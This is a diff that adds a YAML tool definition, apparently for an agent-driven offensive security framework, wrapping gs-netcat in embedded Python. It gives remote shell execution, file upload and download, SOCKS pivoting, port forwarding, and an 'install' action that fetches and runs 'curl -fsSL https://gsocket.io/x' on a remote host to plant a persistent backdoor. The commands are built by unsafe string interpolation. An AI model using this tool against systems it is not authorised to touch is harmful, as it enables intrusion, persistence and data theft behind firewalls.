@@ -1,0 +1,302 @@
+name: "gsocket"
+command: "python3"
+args:
+  - "-c"
+  - |
+    import subprocess, sys, os, signal, time, json, shutil
+
+    action = sys.argv[1] if len(sys.argv) > 1 else "help"
+    secret = sys.argv[2] if len(sys.argv) > 2 else ""
+    param1 = sys.argv[3] if len(sys.argv) > 3 else ""
+    param2 = sys.argv[4] if len(sys.argv) > 4 else ""
+    param3 = sys.argv[5] if len(sys.argv) > 5 else ""
+
+    GS = shutil.which("gs-netcat")
+    if not GS:
+        print(json.dumps({"error": "gs-netcat not found. Install: https://github.com/hackerschoice/gsocket"}))
+        sys.exit(1)
+
+    PIDDIR = os.path.expanduser("~/.gsocket_pids")
+    os.makedirs(PIDDIR, exist_ok=True)
+
+    def pid_file(name):
+        return os.path.join(PIDDIR, f"{name}.pid")
+
+    def save_pid(name, pid, info):
+        with open(pid_file(name), "w") as f:
+            json.dump({"pid": pid, **info}, f)
+
+    def load_pid(name):
+        pf = pid_file(name)
+        if os.path.exists(pf):
+            with open(pf) as f:
+                return json.load(f)
+        return None
+
+    def kill_pid(name):
+        info = load_pid(name)
+        if info and info.get("pid"):
+            try:
+                os.kill(info["pid"], signal.SIGTERM)
+            except ProcessLookupError:
+                pass
+            os.unlink(pid_file(name))
+            return True
+        return False
+
+    if action == "socks":
+        # Start SOCKS5 proxy via gsocket
+        if not secret:
+            print(json.dumps({"error": "secret required"}))
+            sys.exit(1)
+        port = param1 or "1080"
+        name = param2 or f"socks_{port}"
+        kill_pid(name)
+        cmd = [GS, "-s", secret, "-l", "-S", "-p", port, "-D", "-q"]
+        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(1)
+        if proc.poll() is None:
+            save_pid(name, proc.pid, {"type": "socks", "port": port, "secret": secret[:8]+"..."})
+            print(json.dumps({
+                "status": "running",
+                "type": "socks5_proxy",
+                "pid": proc.pid,
+                "listen": f"socks5h://127.0.0.1:{port}",
+                "name": name,
+                "usage": {
+                    "curl": f"curl --proxy socks5h://127.0.0.1:{port} https://target",
+                    "proxychains": f"ALL_PROXY=socks5h://127.0.0.1:{port} nmap ...",
+                    "env": f"export ALL_PROXY=socks5h://127.0.0.1:{port}"
+                }
+            }, indent=2))
+        else:
+            print(json.dumps({"error": "gs-netcat exited immediately", "returncode": proc.returncode}))
+
+    elif action == "forward":
+        # Port forwarding: local port -> remote host:port via gsocket
+        if not secret:
+            print(json.dumps({"error": "secret required"}))
+            sys.exit(1)
+        local_port = param1 or "8443"
+        remote_host = param2 or "127.0.0.1"
+        remote_port = param3 or local_port
+        name = f"fwd_{local_port}"
+        kill_pid(name)
+        cmd = [GS, "-s", secret, "-l", "-d", remote_host, "-p", local_port, "-D", "-q"]
+        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(1)
+        if proc.poll() is None:
+            save_pid(name, proc.pid, {"type": "forward", "local_port": local_port,
+                                       "remote": f"{remote_host}:{remote_port}", "secret": secret[:8]+"..."})
+            print(json.dumps({
+                "status": "running",
+                "type": "port_forward",
+                "pid": proc.pid,
+                "local": f"127.0.0.1:{local_port}",
+                "remote": f"{remote_host}:{remote_port}",
+                "name": name
+            }, indent=2))
+        else:
+            print(json.dumps({"error": "gs-netcat exited immediately"}))
+
+    elif action == "shell":
+        # Interactive shell (non-daemon, runs in foreground with timeout)
+        if not secret:
+            print(json.dumps({"error": "secret required"}))
+            sys.exit(1)
+        timeout = int(param1) if param1 else 30
+        cmd_to_run = param2 or ""
+        if cmd_to_run:
+            # Execute single command via gsocket
+            proc = subprocess.run(
+                [GS, "-s", secret, "-e", f"/bin/sh -c '{cmd_to_run}'"],
+                capture_output=True, text=True, timeout=timeout
+            )
+            print(json.dumps({
+                "stdout": proc.stdout[-4000:] if proc.stdout else "",
+                "stderr": proc.stderr[-2000:] if proc.stderr else "",
+                "returncode": proc.returncode
+            }, indent=2))
+        else:
+            # Just connect and capture banner/output
+            proc = subprocess.run(
+                [GS, "-s", secret, "-i"],
+                capture_output=True, text=True, timeout=timeout,
+                input="id && hostname && uname -a\nexit\n"
+            )
+            print(json.dumps({
+                "stdout": proc.stdout[-4000:] if proc.stdout else "",
+                "stderr": proc.stderr[-2000:] if proc.stderr else "",
+                "returncode": proc.returncode
+            }, indent=2))
+
+    elif action == "upload":
+        # Upload file to remote via gsocket pipe
+        if not secret or not param1:
+            print(json.dumps({"error": "secret and local_file required"}))
+            sys.exit(1)
+        local_file = param1
+        remote_path = param2 or os.path.basename(local_file)
+        if not os.path.isfile(local_file):
+            print(json.dumps({"error": f"file not found: {local_file}"}))
+            sys.exit(1)
+        with open(local_file, "rb") as f:
+            proc = subprocess.run(
+                [GS, "-s", secret, "-e", f"cat > {remote_path}"],
+                stdin=f, capture_output=True, timeout=120
+            )
+        print(json.dumps({
+            "status": "uploaded" if proc.returncode == 0 else "failed",
+            "local": local_file,
+            "remote": remote_path,
+            "size": os.path.getsize(local_file),
+            "returncode": proc.returncode
+        }, indent=2))
+
+    elif action == "download":
+        # Download file from remote via gsocket pipe
+        if not secret or not param1:
+            print(json.dumps({"error": "secret and remote_file required"}))
+            sys.exit(1)
+        remote_file = param1
+        local_path = param2 or os.path.join("/tmp", os.path.basename(remote_file))
+        proc = subprocess.run(
+            [GS, "-s", secret, "-e", f"cat {remote_file}"],
+            capture_output=True, timeout=120
+        )
+        if proc.returncode == 0 and proc.stdout:
+            with open(local_path, "wb") as f:
+                f.write(proc.stdout)
+            print(json.dumps({
+                "status": "downloaded",
+                "remote": remote_file,
+                "local": local_path,
+                "size": len(proc.stdout)
+            }, indent=2))
+        else:
+            print(json.dumps({"error": "download failed", "stderr": proc.stderr.decode()[:500]}))
+
+    elif action == "install":
+        # Install gs-netcat on remote host via existing shell
+        if not secret:
+            print(json.dumps({"error": "secret required (for existing shell access)"}))
+            sys.exit(1)
+        new_secret = param1 or ""
+        install_cmd = 'bash -c "$(curl -fsSL https://gsocket.io/x)"'
+        if new_secret:
+            install_cmd = f'GS_SECRET="{new_secret}" {install_cmd}'
+        proc = subprocess.run(
+            [GS, "-s", secret, "-e", f"/bin/sh -c '{install_cmd}'"],
+            capture_output=True, text=True, timeout=300
+        )
+        print(json.dumps({
+            "status": "install_attempted",
+            "stdout": proc.stdout[-2000:],
+            "stderr": proc.stderr[-1000:],
+            "returncode": proc.returncode
+        }, indent=2))
+
+    elif action == "status":
+        # List active gsocket sessions
+        sessions = []
+        for fname in os.listdir(PIDDIR):
+            if fname.endswith(".pid"):
+                info = load_pid(fname[:-4])
+                if info:
+                    pid = info.get("pid")
+                    alive = False
+                    try:
+                        os.kill(pid, 0)
+                        alive = True
+                    except (ProcessLookupError, TypeError):
+                        pass
+                    info["name"] = fname[:-4]
+                    info["alive"] = alive
+                    sessions.append(info)
+        print(json.dumps({"sessions": sessions}, indent=2))
+
+    elif action == "stop":
+        # Stop a gsocket session by name or all
+        name = secret or "all"  # reuse secret positional for name
+        if name == "all":
+            stopped = []
+            for fname in os.listdir(PIDDIR):
+                if fname.endswith(".pid"):
+                    n = fname[:-4]
+                    if kill_pid(n):
+                        stopped.append(n)
+            print(json.dumps({"stopped": stopped}))
+        else:
+            ok = kill_pid(name)
+            print(json.dumps({"stopped": name, "success": ok}))
+
+    else:
+        print(json.dumps({
+            "actions": {
+                "socks":    "Start SOCKS5 proxy tunnel. Args: secret [port] [name]",
+                "forward":  "Port forward via gsocket. Args: secret local_port [remote_host] [remote_port]",
+                "shell":    "Execute command on remote. Args: secret [timeout] [command]",
+                "upload":   "Upload file to remote. Args: secret local_file [remote_path]",
+                "download": "Download file from remote. Args: secret remote_file [local_path]",
+                "install":  "Install gsocket on remote host. Args: secret [new_secret]",
+                "status":   "List active gsocket sessions",
+                "stop":     "Stop session(s). Args: name_or_all"
+            }
+        }, indent=2))
+enabled: true
+short_description: "Global Socket (gsocket) tunneling - SOCKS proxy, port forwarding, shell, file transfer"
+description: |
+  gsocket (Global Socket) tool for creating encrypted tunnels through NAT/firewalls
+  without port forwarding. Uses the gsocket relay network for peer-to-peer connections
+  authenticated by a shared secret.
+
+  **Capabilities:**
+  - `socks` — Start a SOCKS5 proxy through gsocket tunnel (route any tool through it)
+  - `forward` — Port forwarding: expose remote service on local port
+  - `shell` — Execute commands on remote host via gsocket shell
+  - `upload` — Upload files to remote host
+  - `download` — Download files from remote host
+  - `install` — Install gsocket on a remote host (via existing shell access)
+  - `status` — List active gsocket sessions
+  - `stop` — Stop gsocket session(s)
+
+  **Routing traffic through gsocket SOCKS:**
+  After starting a SOCKS tunnel, route other tools through it:
+  - Set ALL_PROXY=socks5h://127.0.0.1:1080 before running tools
+  - Use proxychains with socks5 127.0.0.1 1080
+  - Use curl --proxy socks5h://127.0.0.1:1080
+
+  **Security:** All traffic is end-to-end encrypted. The shared secret authenticates peers.
+  Requires gs-netcat binary (https://github.com/hackerschoice/gsocket).
+parameters:
+  - name: "action"
+    type: "string"
+    description: "Action: socks, forward, shell, upload, download, install, status, stop"
+    required: true
+    position: 0
+    format: "positional"
+    options: ["socks", "forward", "shell", "upload", "download", "install", "status", "stop", "help"]
+  - name: "secret"
+    type: "string"
+    description: "gsocket shared secret (or session name for 'stop' action)"
+    required: false
+    position: 1
+    format: "positional"
+  - name: "param1"
+    type: "string"
+    description: "Context-dependent: port (socks/forward), timeout (shell), local_file (upload), remote_file (download)"
+    required: false
+    position: 2
+    format: "positional"
+  - name: "param2"
+    type: "string"
+    description: "Context-dependent: name (socks), remote_host (forward), command (shell), remote_path (upload/download)"
+    required: false
+    position: 3
+    format: "positional"
+  - name: "param3"
+    type: "string"
+    description: "Context-dependent: remote_port (forward)"
+    required: false
+    position: 4
+    format: "positional"
